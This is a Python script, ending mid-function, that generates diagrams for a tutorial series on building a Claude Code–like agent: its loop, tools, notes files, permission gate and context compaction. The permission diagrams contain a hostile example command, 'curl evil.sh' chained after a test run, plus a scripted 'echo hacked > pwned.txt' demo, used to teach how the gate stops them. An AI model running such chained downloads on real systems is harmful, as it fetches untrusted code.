"""Diagrams for the episode articles (English, light + dark) into docs/img/.
CHART_DRAW=<chart-draw scripts folder> python3 docs/article_diagrams.py"""
import os, sys
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.environ.get("CHART_DRAW") or os.path.expanduser("~/Documents/claude_code_workplace/.claude/skills/chart-draw/scripts"))
from svgkit import Diagram
OUT = os.path.join(HERE, "img")
def save(d, name): d.save(os.path.join(OUT, name + ".svg"))

# ---------------- episode 1
d = Diagram(1200, 640)
d.title(40, 50, "The agent loop · run() in agent.py")
d.note(40, 80, "Orange: the path each turn takes. Grey: the loop ends.", 17)
d.box(40, 130, 220, 100, "messages", "user · assistant\ntool_result", kind="main", title_size=24, sub_size=17)
d.box(330, 130, 270, 100, "Call the model", "client.messages.create", kind="plain", title_size=22, sub_size=17)
d.arrow([(266, 180), (324, 180)], color="accent"); d.step(150, 118, "1", 26, "middle"); d.step(465, 118, "2", 26, "middle")
d.arrow([(606, 180), (664, 180)], color="accent")
d.box(670, 130, 270, 100, "Check stop_reason", "is it tool_use?", kind="main", title_size=22, sub_size=17); d.step(805, 118, "3", 26, "middle")
d.arrow([(946, 180), (1004, 180)], color="grey", label="no", label_size=17)
d.box(1010, 130, 150, 100, "Return the answer", "end_turn", kind="faded", title_size=17, sub_size=16)
d.arrow([(805, 236), (805, 384)], color="accent", label="yes: tool_use", label_size=17)
d.box(670, 390, 270, 100, "Run the tool", "run_tool(...)\nour code does the work", kind="accent", title_size=22, sub_size=16); d.step(805, 540, "4", 26, "middle")
d.arrow([(664, 440), (606, 440)], color="accent")
d.box(330, 390, 270, 100, "Wrap as tool_result", "same id as the request", kind="plain", title_size=21, sub_size=17)
d.arrow([(324, 440), (266, 440)], color="accent")
d.box(40, 390, 220, 100, "Append to messages", "as a user message", kind="plain", title_size=19, sub_size=17); d.step(465, 540, "5", 26, "middle")
d.arrow([(150, 384), (150, 236)], color="accent", width=4, label="back to step 2", label_size=17)
d.note(40, 610, "The whole loop: call the model, check stop_reason, run the tool, append the result, repeat.", 19)
save(d, "ep01-loop")

d = Diagram(1200, 680)
d.title(40, 52, "One question, two turns")
d.note(40, 80, "Orange: requests. Grey dashed: replies.", 17)
cols = [("User", "", 140, "plain"), ("agent.py", "our code", 440, "main"), ("Model", "Claude / DeepSeek", 760, "accent"), ("list_files", "tool function", 1050, "plain")]
for name, sub, cx, kind in cols:
    d.box(cx - 105, 104, 210, 76, name, sub or None, kind=kind, title_size=20, sub_size=15)
    d.line(cx, 186, cx, 650, color="#c9c4ba", width=2, dash="3 7")
msgs = [(0, 1, "What is in this folder?", False), (1, 2, "messages.create(messages)", False), (2, 1, "tool_use · list_files", True),
        (1, 3, "run_tool → list_files(\".\")", False), (3, 1, "agent.py  test_loop.py", True), (1, 2, "messages.create(+ result)", False),
        (2, 1, "end_turn · text answer", True), (1, 0, "This folder has two files", True)]
for k, (a, b, text, ret) in enumerate(msgs):
    y = 232 + k * 58; xa, xb = cols[a][2], cols[b][2]; s = 1 if xb > xa else -1
    d.arrow([(xa + s * 8, y), (xb - s * 10, y)], color="grey" if ret else "accent", dashed=ret, width=2 if ret else 2.5)
    lx = (760 + 1050) / 2 if 3 in (a, b) else (xa + xb) / 2
    d.text(lx, y - 12, "%d. %s" % (k + 1, text), 18, "#6b6b6b" if ret else "#d4600b", 400 if ret else 700, "middle")
save(d, "ep01-sequence")

d = Diagram(1200, 640)
d.title(40, 50, "The model has no memory: every call resends the whole messages list")
cols = [("Call 1 · 1 message", 130, [("user", "question", "plain")]),
        ("Call 2 · 3 messages", 500, [("user", "question", "plain"), ("assistant", "tool_use", "plain"), ("user", "tool_result", "plain")]),
        ("Call 3 · 5 messages", 870, [("user", "question", "plain"), ("assistant", "tool_use", "plain"), ("user", "tool_result", "plain"), ("assistant", "tool_use", "plain"), ("user", "tool_result", "accent")])]
for name, x, items in cols:
    d.text(x + 100, 118, name, 20, "#1f1f1f", 700, "middle")
    for j, (role, what, kind) in enumerate(items):
        d.box(x, 140 + j * 74, 200, 62, role, what, kind="accent" if kind == "accent" else "plain", title_size=18, sub_size=16)
d.arrow([(340, 200), (490, 200)], color="grey", dashed=True); d.arrow([(710, 200), (860, 200)], color="grey", dashed=True)
d.text(600, 610, "The longer the conversation, the more each call sends, and the more it costs", 20, "#d4600b", 700, "middle")
save(d, "ep01-stateless")

d = Diagram(1200, 600)
d.title(40, 50, "Claude Code's three phases · and our minimal version")
d.panel(40, 90, 480, 440, "Claude Code (official docs)"); d.panel(680, 90, 480, 440, "Our agent.py")
rows = [("Gather context", "read files, search", "list_files", "this episode", "accent"), ("Take action", "edit files, run commands", "edit_file · run_bash", "next episode", "dashed"), ("Verify results", "run the tests, look again", "feed the output back", "same loop", "dashed")]
for k, (a, sub, mine, tag, kind) in enumerate(rows):
    y = 150 + k * 125
    d.box(70, y, 420, 96, a, sub, kind="main", title_size=22, sub_size=17); d.box(710, y, 420, 96, mine, tag, kind=kind, title_size=21, sub_size=17)
    d.arrow([(496, y + 48), (704, y + 48)], color="accent" if kind == "accent" else "grey", dashed=kind != "accent", width=2.5)
d.note(40, 572, "The phases blend together and repeat until the model's reply has no tool calls.", 18)
save(d, "ep01-three-phases")

d = Diagram(1200, 520)
d.title(40, 50, "Same code, two models: change one environment variable")
d.box(450, 190, 300, 130, "agent.py", "Anthropic message format\ntool_use · tool_result", kind="main", title_size=26, sub_size=17)
d.box(40, 190, 300, 130, "Claude API", "claude-haiku-5-5", kind="plain", title_size=24, sub_size=17)
d.arrow([(446, 255), (346, 255)], color="ink", both=True)
d.text(110, 360, "PROVIDER=claude", 20, "#6b6b6b", 700); d.text(95, 388, "ANTHROPIC_API_KEY", 18, "#8a8a8a")
d.box(860, 190, 300, 130, "DeepSeek API", "deepseek-flash", kind="accent", title_size=24, sub_size=17)
d.arrow([(754, 255), (854, 255)], color="accent", both=True)
d.text(880, 360, "PROVIDER=deepseek", 20, "#d4600b", 700); d.text(895, 388, "DEEPSEEK_API_KEY", 18, "#8a8a8a")
d.text(1010, 150, "used in the videos", 20, "#d4600b", 700, "middle"); d.text(1010, 172, "api.deepseek.com/anthropic", 17, "#8a8a8a", 400, "middle")
d.note(40, 480, "DeepSeek offers an Anthropic-compatible endpoint, so only the key, the address and the model name change.", 18)
save(d, "ep01-providers")

# ---------------- episode 2
d = Diagram(1200, 560)
d.title(40, 52, "A tool is four things")
rows = [("Name", "read_file", "plain"), ("Description", "Read a text file and return its lines…", "plain"), ("Input schema", "{ path: string }", "plain"), ("The function", "def read_file(path): …", "dashed")]
for k, (a, b, kind) in enumerate(rows):
    y = 90 + k * 106; d.text(50, y + 54, a, 22, "#1f1f1f", 700); d.box(300, y, 560, 82, b, None, kind=kind, title_size=21)
d.line(900, 96, 900, 392, color="#d4600b", width=4); d.text(920, 225, "The model sees these", 22, "#d4600b", 700); d.text(920, 258, "name · description · schema", 17, "#6b6b6b")
d.line(900, 412, 900, 492, color="#8a8a8a", width=4); d.text(920, 458, "Only our code sees this", 22, "#6b6b6b", 700)
save(d, "ep02-tool-anatomy")

d = Diagram(1200, 560)
d.title(40, 52, "edit_file: old_text must appear, and appear exactly once")
cases = [(60, "0 matches", "return a * b", "not in the file", "error", "plain", 0), (440, "1 match", "return a - b", "only one place", "edited calc.py", "accent", 1), (820, "2+ matches", "result", "several places", "error", "plain", 4)]
for x, head, old, why, out, kind, cnt in cases:
    d.text(x + 150, 118, head, 22, "#d4600b" if kind == "accent" else "#1f1f1f", 700, "middle")
    d.box(x, 150, 300, 90, "old_text = " + old, why, kind="plain", title_size=18, sub_size=16)
    d.arrow([(x + 150, 246), (x + 150, 318)], color="accent" if kind == "accent" else "grey")
    if kind == "accent": d.box(x, 324, 300, 100, "edited calc.py", "replaced", kind="accent", title_size=21, sub_size=17)
    else: d.box(x, 324, 300, 100, "error", "'old_text' appears %d times" % cnt, kind="dashed", title_size=21, sub_size=16)
d.note(60, 500, "The error says how many times it matched, so the model knows how to fix the call.", 19)
save(d, "ep02-edit-match")

d = Diagram(1200, 640)
d.title(40, 52, "An error is just another result: the model recovers on its own")
d.note(40, 84, "Orange: requests. Grey dashed: replies.", 17)
cols = [("Model", 220, "accent"), ("agent.py", 700, "main")]
for name, cx, kind in cols:
    d.box(cx - 120, 110, 240, 70, name, None, kind=kind, title_size=22); d.line(cx, 186, cx, 620, color="#c9c4ba", width=2, dash="3 7")
msgs = [(0, 1, "1. edit_file (file not read yet)", False), (1, 0, "2. error: read the file first", True), (0, 1, "3. read_file(calc.py)", False),
        (1, 0, "4. file contents", True), (0, 1, "5. edit_file (same change)", False), (1, 0, "6. edited calc.py", True)]
for k, (a, b, text, ret) in enumerate(msgs):
    y = 235 + k * 66; xa, xb = cols[a][1], cols[b][1]; s = 1 if xb > xa else -1
    d.arrow([(xa + s * 8, y), (xb - s * 10, y)], color="grey" if ret else "accent", dashed=ret, width=2 if ret else 2.5)
    d.text((xa + xb) / 2, y - 14, text, 20, "#6b6b6b" if ret else "#d4600b", 400 if ret else 700, "middle")
save(d, "ep02-error-recovery")

d = Diagram(1200, 520)
d.title(40, 52, "Don't flood the context: cut long output")
d.text(60, 130, "Tool output", 21, "#1f1f1f", 700); d.bar(60, 150, 1000, 44, color="#d8d4cc"); d.text(1075, 182, "20,000 chars", 18, "#6b6b6b")
d.text(60, 250, "Returned to the model (our code)", 21, "#1f1f1f", 700); d.bar(60, 270, 200, 44, color="#d4600b")
d.text(275, 302, "at most 4,000 chars + \"... cut off. Ask for less.\"", 18, "#d4600b", 700)
d.panel(60, 350, 1080, 130)
d.text(90, 392, "Claude Code (official docs)", 21, "#1f1f1f", 700)
d.text(90, 430, "Bash output over about 30,000 characters is saved to a file, with a short preview kept", 19, "#6b6b6b")
d.text(90, 462, "Anthropic's article: tool responses default to at most 25,000 tokens in Claude Code", 19, "#6b6b6b")
save(d, "ep02-truncation")

d = Diagram(1200, 580)
d.title(40, 52, "Boundaries: a path check and a timeout")
d.panel(40, 90, 620, 440, "The project folder")
for k, nm in enumerate(["read_file", "grep", "edit_file"]): d.box(80 + k * 190, 160, 170, 80, nm, "checks the path", kind="plain", title_size=18, sub_size=15)
d.text(80, 300, "Path inside the project folder: allowed", 20, "#1e7a3c", 700)
d.panel(760, 90, 400, 440, "Other folders")
d.arrow([(640, 200), (756, 200)], color="grey"); d.text(790, 190, "for example ../p-other", 18, "#6b6b6b"); d.text(790, 300, "✗ path outside: refused", 20, "#c23b22", 700)
d.box(80, 400, 300, 90, "run_bash", "not covered by the path check", kind="dashed", title_size=21, sub_size=16)
d.arrow([(384, 445), (754, 445)], color="accent"); d.text(400, 432, "can reach other folders", 18, "#d4600b", 700)
d.text(80, 520, "So real permissions come later (episode 4).", 20, "#d4600b", 700)
save(d, "ep02-boundary")

d = Diagram(1200, 700)
d.title(40, 52, "Our four tools · Claude Code's built-in tools")
d.panel(40, 90, 440, 570, "Ours (this episode)"); d.panel(660, 90, 500, 570, "Claude Code (official docs)")
pairs = [("read_file", "Read", "no permission prompt"), ("grep", "Grep", "off by default on macOS / Linux"), ("run_bash", "Bash", "asks first"), ("edit_file", "Edit", "asks first")]
for k, (a, b, c) in enumerate(pairs):
    y = 150 + k * 108
    d.box(70, y, 380, 84, a, None, kind="plain", title_size=21); d.box(690, y, 440, 84, b, c, kind="main", title_size=21, sub_size=16)
    d.arrow([(456, y + 42), (684, y + 42)], color="accent", width=2.5)
d.text(690, 630, "Also: Write · Glob\nWebFetch · WebSearch · subagents", 19, "#6b6b6b")
save(d, "ep02-compare")

d = Diagram(1200, 600)
d.title(40, 52, "A real run: 5 turns")
d.note(40, 84, "Task: the tests in this folder fail. Find out why and fix it.", 19)
rows = [("1", "run_bash", "ls -la", "plain"), ("2", "read_file × 2", "calc.py and test_calc.py (two requests in one reply)", "accent"),
        ("3", "edit_file", "return a - b  →  return a + b", "plain"), ("4", "run_bash", "python3 test_calc.py", "plain"), ("5", "end_turn", "no more tool calls: the loop ends with an answer", "main")]
for k, (t, a, b, kind) in enumerate(rows):
    y = 110 + k * 96
    d.text(60, y + 50, "Turn %s" % t, 22, "#6b6b6b", 700); d.box(200, y, 260, 76, a, None, kind=kind, title_size=21); d.text(490, y + 46, b, 20, "#1f1f1f", 600)
save(d, "ep02-run-trace")

# ---------------- extra charts
d = Diagram(1200, 560)
d.title(40, 52, "Who does what: the model proposes, our code acts")
d.panel(40, 90, 500, 410, "The model (the API)")
d.panel(660, 90, 500, 410, "Our program (agent.py)")
for k, t in enumerate(["reads the messages list", "decides: answer, or ask for a tool", "writes a tool_use block", "reads the tool_result"]):
    d.box(70, 150 + k * 82, 440, 66, t, None, kind="plain", title_size=18)
for k, t in enumerate(["sends the messages list", "checks stop_reason", "runs the tool (run_tool)", "wraps the output as tool_result"]):
    d.box(690, 150 + k * 82, 440, 66, t, None, kind="accent" if k == 2 else "plain", title_size=18)
d.arrow([(544, 183), (656, 183)], color="grey", dashed=True)
d.arrow([(656, 265), (544, 265)], color="accent")
d.arrow([(544, 347), (656, 347)], color="grey", dashed=True)
d.arrow([(656, 429), (544, 429)], color="accent")
d.note(40, 536, "The model never runs anything itself. Everything that touches your machine happens in our program.", 18)
save(d, "ep01-who-does-what")

d = Diagram(1200, 560)
d.title(40, 52, "How one tool call becomes a result")
steps = [("tool_use block", "name + input\nfrom the model", "plain"), ("run_tool", "looks up the\nfunction by name", "main"), ("the tool function", "read_file · grep\nrun_bash · edit_file", "accent"), ("cut(...)", "read_file, run_bash:\nat most 4,000 chars", "plain"), ("tool_result", "content + is_error\nsent back", "plain")]
for k, (a, b, kind) in enumerate(steps):
    x = 40 + k * 232
    d.box(x, 180, 200, 120, a, b, kind=kind, title_size=19, sub_size=16)
    if k < 4: d.arrow([(x + 204, 240), (x + 228, 240)], color="accent")
d.box(272, 380, 200, 90, "ToolError / exception", "caught in run_tool", kind="dashed", title_size=16, sub_size=15)
d.arrow([(372, 304), (372, 374)], color="grey", dashed=True)
d.arrow([(476, 425), (1010, 425), (1010, 306)], color="grey", dashed=True, label="is_error: true", label_at=(760, 410), label_size=16)
d.note(40, 520, "A failure never crashes the loop: it becomes a tool_result with is_error set, and the model reads it.", 18)
save(d, "ep02-tool-call-path")

d = Diagram(1200, 740)
d.title(40, 52, "edit_file: the checks, in order")
qs = [("1. Is the path inside the project folder?", "error: path is outside the project folder"),
      ("2. Was the file read earlier in this session?", "error: read the file first"),
      ("3. Does old_text appear exactly once?", "error: 'old_text' appears N times")]
for k, (q, e) in enumerate(qs):
    y = 100 + k * 150
    d.box(60, y, 480, 84, q, None, kind="main", title_size=18)
    d.arrow([(546, y + 42), (640, y + 42)], color="grey", dashed=True, label="no", label_size=17)
    d.box(646, y, 500, 84, e, None, kind="dashed", title_size=17)
    if k < 2: d.arrow([(300, y + 90), (300, y + 144)], color="accent", label="yes", label_size=17)
d.arrow([(300, 490), (300, 594)], color="accent", label="yes", label_size=17)
d.box(60, 600, 480, 90, "Replace, write, return 'edited <path>'", None, kind="accent", title_size=19)
d.note(646, 660, "Each refusal is a clear sentence the model can act on.", 18)
save(d, "ep02-edit-checks")

d = Diagram(1200, 620)
d.title(40, 52, "Repository layout")
d.panel(40, 90, 1120, 480)
rows = [("README.md · SYLLABUS.md · LICENSE", "start here"), ("articles/", "one full written article per episode"), ("docs/", "part introductions and the diagrams (img/)"),
        ("ep01/", "agent.py · test_loop.py · demo/"), ("ep02/", "agent.py · test_tools.py · sandbox/ · demo/"), ("ep03/ … ep13/", "one folder per episode, added as the series grows")]
for k, (a, b) in enumerate(rows):
    y = 120 + k * 72
    d.box(70, y, 420, 58, a, None, kind="accent" if k == 3 else "plain", title_size=17)
    d.text(520, y + 36, b, 19, "#6b6b6b")
save(d, "repo-layout")
print("extra ok")
print("ok")

# ---------------- episode 3
d = Diagram(1200, 600)
d.title(40, 52, "What the model receives on every call")
d.panel(40, 90, 540, 470, "system (the system prompt)")
for k, (a, b) in enumerate([("Role", "a small coding assistant"), ("Rules", "look first · read before edit · run tests"), ("Environment", "project folder · platform")]):
    d.box(70, 150 + k * 122, 480, 100, a, b, kind="plain", title_size=24, sub_size=17)
d.panel(620, 90, 540, 470, "messages")
d.panel(650, 150, 480, 250, "first user message")
d.box(676, 200, 428, 74, "Notes (NOTES.md)", "only if the file exists", kind="accent", title_size=22, sub_size=17)
d.box(676, 296, 428, 74, "Task", "Task: ...", kind="plain", title_size=22, sub_size=17)
d.box(650, 424, 480, 100, "then: assistant · tool_result ...", None, kind="dashed", title_size=19)
d.note(40, 586, "The notes go in the first user message, not in the system prompt: as Claude Code does with CLAUDE.md.", 17)
save(d, "ep03-what-model-receives")

d = Diagram(1200, 640)
d.title(40, 52, "Where notes files live: broad to specific, joined together")
rows = [("Organisation", "managed policy: one file in a system folder"), ("You", "~/.claude/CLAUDE.md · all your projects"),
        ("Project", "./CLAUDE.md · can be shared with the team"), ("You + project", "./CLAUDE.local.md · not committed")]
for k, (a, b) in enumerate(rows):
    y = 100 + k * 100
    d.box(60, y, 260, 76, a, None, kind="accent" if k == 2 else "plain", title_size=22)
    d.text(350, y + 46, b, 20, "#1f1f1f", 600)
d.arrow([(1150, 580), (1150, 110)], color="accent")
d.text(840, 300, "from the working directory", 20, "#d4600b", 700); d.text(840, 332, "up through every parent", 20, "#d4600b", 700)
d.box(60, 520, 560, 90, "Notes in a subfolder", "loaded when Claude reads or writes a file there", kind="dashed", title_size=21, sub_size=17)
d.text(660, 574, "All found files are joined, not overridden", 20, "#d4600b", 700)
save(d, "ep03-notes-locations")

d = Diagram(1200, 560)
d.title(40, 52, "The test set: fixed tasks, checked by code")
d.box(40, 120, 250, 100, "Fixed tasks", "discount · helper", kind="main", title_size=24, sub_size=17)
d.box(360, 100, 260, 64, "No notes", None, kind="plain", title_size=22)
d.box(360, 190, 260, 64, "With notes", None, kind="accent", title_size=22)
d.arrow([(296, 160), (354, 132)], color="ink"); d.arrow([(296, 180), (354, 222)], color="accent")
d.box(690, 120, 230, 100, "Run the agent", "fresh copy of the folder", kind="plain", title_size=21, sub_size=15)
d.arrow([(626, 132), (684, 160)], color="ink"); d.arrow([(626, 222), (684, 180)], color="accent")
d.box(980, 120, 190, 100, "Code checks", "never the model", kind="accent", title_size=21, sub_size=16)
d.arrow([(926, 170), (974, 170)], color="accent")
d.text(60, 360, "Checks: import the module · call the function · look at the result · is the file there · is there a Done: line", 20, "#1f1f1f", 600)
d.note(60, 420, "Each task, each condition, three runs. One model (DeepSeek), a small sample.", 19)
save(d, "ep03-eval-flow")

d = Diagram(1200, 640)
d.title(40, 52, "Results: passes out of three runs")
d.text(560, 110, "No notes", 22, "#6b6b6b", 700, "middle"); d.text(960, 110, "With notes", 22, "#d4600b", 700, "middle")
rows = [("Discount: integer result", 3, 3), ("Discount: one-line docstring", 3, 3), ("Discount: rounds half up", 2, 3),
        ("Discount: ends with Done: line", 0, 3), ("Helper: file in helpers/", 0, 3), ("Helper: works", 0, 3)]
for k, (a, x, y) in enumerate(rows):
    yy = 150 + k * 78
    d.text(40, yy + 34, a, 21, "#1f1f1f", 600)
    d.bar(440, yy + 6, 240 * x / 3.0 if x else 0.01, 40, color="#8a8a8a")
    d.text(440 + 240 * x / 3.0 + 12 if x else 452, yy + 38, "%d/3" % x, 22, "#6b6b6b", 700)
    d.bar(840, yy + 6, 240 * y / 3.0, 40, color="#d4600b")
    d.text(840 + 240 * y / 3.0 + 12, yy + 38, "%d/3" % y, 22, "#d4600b", 700)
d.note(40, 625, "\"Works\" is only checked when the file exists, so without notes (no file in helpers/) it counts as 0.", 17)
save(d, "ep03-results")

d = Diagram(1200, 620)
d.title(40, 52, "Our notes file and Claude Code's CLAUDE.md")
d.panel(40, 90, 440, 500, "Ours (this episode)")
d.panel(660, 90, 500, 500, "Claude Code docs")
pairs = [("One NOTES.md", "Several levels: user · project · local · organisation"), ("In the first user message", "Same: a user message after the system prompt"),
         ("Over 200 lines: a warning", "Aim for under 200 lines per file")]
for k, (a, b) in enumerate(pairs):
    y = 150 + k * 120
    d.box(70, y, 380, 84, a, None, kind="plain", title_size=20)
    d.box(690, y, 440, 84, b, None, kind="main", title_size=17)
    d.arrow([(456, y + 42), (684, y + 42)], color="accent", width=2.5)
d.text(690, 530, "Also: @ imports (up to four hops deep)", 18, "#6b6b6b")
d.text(690, 562, "Must-happen rules: use hooks, not notes", 18, "#d4600b", 700)
save(d, "ep03-compare")

# ---------------- episode 4
d = Diagram(1200, 560)
d.title(40, 52, "The gate sits between the model's request and the run")
d.box(40, 150, 240, 100, "Model", "I want to run this", kind="plain", title_size=26, sub_size=17)
d.box(400, 130, 260, 140, "Gate", "check · gated", kind="accent", title_size=30, sub_size=19)
d.box(800, 150, 240, 100, "Run the tool", "run_tool", kind="plain", title_size=24, sub_size=17)
d.arrow([(286, 200), (394, 200)], color="accent", label="tool_use", label_size=17)
d.arrow([(666, 200), (794, 200)], color="accent", label="allow", label_size=19)
d.arrow([(530, 276), (530, 346)], color="ink", label="ask", label_size=19)
d.box(400, 352, 260, 90, "Ask the user", "y · a · n", kind="main", title_size=24, sub_size=17)
d.arrow([(400, 240), (286, 240)], color="grey", dashed=True, width=2)
d.text(40, 310, "deny: an error goes back to the model", 18, "#6b6b6b", 700)
d.note(40, 520, "Every tool call passes the gate first. Three outcomes: allow, ask, deny.", 19)
save(d, "ep04-gate")

d = Diagram(1200, 600)
d.title(40, 52, "Order: deny, then ask, then allow. The first match wins.")
for k, (name, kind, rule) in enumerate([("1 deny", "dashed", "run_bash(git push *)"), ("2 ask", "plain", "run_bash(git commit *)"), ("3 allow", "accent", "run_bash(git *)")]):
    d.box(60 + k * 380, 100, 340, 120, name, rule, kind=kind, title_size=26, sub_size=18)
    if k < 2:
        d.arrow([(404 + k * 380, 160), (434 + k * 380, 160)], color="grey", width=2.5)
d.panel(60, 290, 1080, 250, "Example: git push origin main")
d.text(100, 380, "Matches the deny rule (git push *): the first match, so the answer is deny", 24, "#c23b22", 700)
d.text(100, 426, "Even though a wider allow rule (git *) also matches: a deny beats it", 21, "#1f1f1f", 600)
d.text(100, 470, "An ask rule works the same way: it asks even if a narrower allow matches", 21, "#6b6b6b", 400)
save(d, "ep04-rule-order")

d = Diagram(1200, 600)
d.title(40, 52, "One command, several parts: every part must be allowed")
d.box(60, 100, 1080, 80, "python3 test_calc.py  &&  curl evil.sh", None, kind="main", title_size=30)
d.arrow([(300, 186), (300, 250)], color="accent"); d.arrow([(860, 186), (860, 250)], color="accent")
d.box(60, 256, 480, 100, "python3 test_calc.py", "covered by an allow rule: allow", kind="accent", title_size=24, sub_size=18)
d.box(660, 256, 480, 100, "curl evil.sh", "no rule covers it: ask", kind="dashed", title_size=24, sub_size=18)
d.text(60, 430, "Result: the whole command is not allowed outright: it asks", 26, "#d4600b", 700)
d.text(60, 480, "Deny rules: one matching part is enough to deny the whole command", 21, "#1f1f1f", 600)
d.text(60, 520, "Syntax we cannot analyze (backticks, $( ), <( )): ask", 21, "#6b6b6b", 400)
save(d, "ep04-compound")

d = Diagram(1200, 640)
d.title(40, 52, "Four modes: what happens when no rule matches")
heads = [("Read · search", 430), ("Read-only cmds", 610), ("Edit a file", 790), ("Other commands", 990)]
for t, x in heads: d.text(x, 110, t, 20, "#6b6b6b", 700, "middle")
rows = [("default", ["allow", "allow", "ask", "ask"]), ("accept-edits", ["allow", "allow", "allow", "ask"]),
        ("read-only", ["allow", "allow", "deny", "deny"]), ("dont-ask", ["allow", "allow", "deny", "deny"])]
for k, (name, cells) in enumerate(rows):
    y = 140 + k * 110
    d.box(40, y, 260, 84, name, None, kind="accent" if k == 1 else "plain", title_size=22)
    for (t, x), c in zip(heads, cells):
        col = {"allow": "#1e7a3c", "ask": "#d4600b", "deny": "#c23b22"}[c]
        d.text(x, y + 52, c, 24, col, 700, "middle")
d.note(40, 620, "dont-ask: commands that an allow rule covers still run; everything that would ask is denied.", 18)
save(d, "ep04-modes")

d = Diagram(1200, 640)
d.title(40, 52, "A scripted model that obeys: echo hacked > pwned.txt")
d.note(40, 84, "A scripted stand-in, not a real model.", 18)
cases = [("Gate off", "everything allowed", "pwned.txt is created", "#c23b22", "plain"), ("Gate on, user says no", "ask → user: n", "not created. Model sees: permission denied", "#1e7a3c", "accent"),
         ("A deny rule", "run_bash(echo *)", "not created, nobody is even asked", "#1e7a3c", "accent")]
for k, (a, b, c, col, kind) in enumerate(cases):
    y = 120 + k * 160
    d.box(40, y, 300, 110, a, b, kind=kind, title_size=22, sub_size=18)
    d.arrow([(346, y + 55), (426, y + 55)], color="accent" if kind == "accent" else "grey")
    d.text(440, y + 66, c, 24, col, 700)
save(d, "ep04-fooled")

d = Diagram(1200, 520)
d.title(40, 52, "Questions asked in the same bug-fix task (3 runs each)")
d.text(40, 140, "Default mode, no rules", 22, "#1f1f1f", 700)
for k in range(3):
    d.bar(400, 112 + k * 52, 4 * 120, 38, color="#8a8a8a"); d.text(400 + 4 * 120 + 14, 142 + k * 52, "4", 22, "#6b6b6b", 700)
d.text(40, 340, "accept-edits + one allow rule", 22, "#1f1f1f", 700)
for k in range(3):
    d.bar(400, 312 + k * 52, 1 * 120, 38, color="#d4600b"); d.text(400 + 120 + 14, 342 + k * 52, "1 (a find command)", 22, "#d4600b", 700)
save(d, "ep04-questions")

d = Diagram(1200, 640)
d.title(40, 52, "Our permissions and the Claude Code docs")
d.panel(40, 90, 440, 520, "Ours (this episode)")
d.panel(660, 90, 500, 520, "Claude Code docs")
pairs = [("4 modes", "More: plan · auto · dontAsk · bypass"), ("A small read-only command list", "A longer list, with find and read-only git"),
         ("Deny: any part matching", "Also checked inside subshells"), ("No sandbox", "Sandbox: OS-level isolation")]
for k, (a, b) in enumerate(pairs):
    y = 150 + k * 110
    d.box(70, y, 380, 84, a, None, kind="plain", title_size=19)
    d.box(690, y, 440, 84, b, None, kind="main", title_size=16)
    d.arrow([(456, y + 42), (684, y + 42)], color="accent", width=2.5)
save(d, "ep04-compare")

# ---------------- episode 5
import csv
REPEAT = os.path.join(os.path.dirname(HERE), "ep05", "demo", "repeat")

d = Diagram(1200, 520)
d.title(40, 52, "What fills the window: a real run, turn 25 of 25 (no management)")
d.panel(40, 100, 1120, 150, "The window, about 25,000 tokens")
d.bar(60, 150, 34, 70, color="#8a8a8a"); d.bar(94, 150, 1046, 70, color="#d4600b")
d.text(60, 280, "system prompt + tools + task + notes", 20, "#6b6b6b", 700); d.text(60, 306, "about 800", 24, "#1f1f1f", 800)
d.text(1140, 280, "24 file reads, about 1,000 tokens each", 20, "#d4600b", 700, "end"); d.text(1140, 306, "about 24,500", 24, "#d4600b", 800, "end")
d.panel(40, 350, 1120, 140, "Every turn sends the whole history again")
for k, (lab, w) in enumerate([("turn 5", 220), ("turn 10", 400), ("turn 15", 580), ("turn 20", 760), ("turn 25", 960)]):
    d.text(70 + k * 218, 412, lab, 17, "#6b6b6b", 700); d.bar(70 + k * 218, 424, 190 * (w / 960), 14, color="#d4600b")
d.note(70, 470, "The longer the history, the more each turn sends, and the more the model has to sift (context rot).", 19)
save(d, "ep05-window")

d = Diagram(1200, 520)
d.title(40, 52, "How big is the window? Add the three numbers the API returns")
d.box(40, 120, 320, 120, "input_tokens", "new input", kind="plain", title_size=28, sub_size=20)
d.box(440, 120, 340, 120, "cache_read_input_tokens", "read from the cache", kind="plain", title_size=21, sub_size=20)
d.box(860, 120, 300, 120, "cache_creation_input_tokens", "written to the cache", kind="plain", title_size=17, sub_size=20)
d.text(392, 192, "+", 54, "#1f1f1f", 800, "middle"); d.text(820, 192, "+", 54, "#1f1f1f", 800, "middle")
d.text(200, 290, "225", 60, "#1f1f1f", 800, "middle"); d.text(610, 290, "1,408", 60, "#1f1f1f", 800, "middle"); d.text(1010, 290, "0", 60, "#1f1f1f", 800, "middle")
d.box(340, 340, 520, 120, "window = 1,633", "DeepSeek endpoint, second call (real)", kind="accent", title_size=40, sub_size=20)
save(d, "ep05-count")

d = Diagram(1200, 560)
d.title(40, 52, "Clearing: the newest 3 tool results stay, older ones become one line")
d.panel(40, 90, 540, 440, "Before"); d.panel(620, 90, 540, 440, "After")
for k, (name, age) in enumerate([("read mod00.py", "old"), ("read mod01.py", "old"), ("read mod02.py", "old"), ("read mod03.py", "new"), ("read mod04.py", "new"), ("read mod05.py", "new")]):
    y = 140 + k * 62
    d.box(60, y, 500, 50, "%s -> about 1,000 tokens" % name, None, kind="plain", title_size=18)
    d.box(640, y, 500, 50, ("%s -> [old result cleared]" % name) if age == "old" else ("%s -> about 1,000 tokens" % name), None, kind="dashed" if age == "old" else "accent", title_size=18)
d.note(640, 520, "Every tool call keeps a result, so the pairs stay valid.", 19)
save(d, "ep05-clear")

d = Diagram(1200, 560)
d.title(40, 52, "Compaction: the old turns become one summary")
d.box(40, 130, 300, 120, "Old turns", "all but the last 4", kind="plain", title_size=28, sub_size=18)
d.box(440, 130, 300, 120, "The model writes a summary", "fixed prompt", kind="accent", title_size=20, sub_size=18)
d.box(840, 130, 320, 120, "One summary", "task · decisions · files · open items · next step", kind="main", title_size=28, sub_size=15)
d.arrow([(346, 190), (434, 190)], color="accent", width=3); d.arrow([(746, 190), (834, 190)], color="accent", width=3)
d.panel(40, 300, 1120, 220, "The message list afterwards")
d.box(70, 350, 300, 100, "Task + notes", "first message, unchanged", kind="plain", title_size=22, sub_size=17)
d.box(400, 350, 300, 100, "Summary + files touched", "appended to the first message", kind="accent", title_size=19, sub_size=17)
d.box(730, 350, 400, 100, "Last 4 turns", "kept whole, calls and results paired", kind="plain", title_size=22, sub_size=17)
d.note(70, 490, "The same model writes the summary; we do not claim it matches Claude Code's.", 19)
save(d, "ep05-compact")

def _series(name):
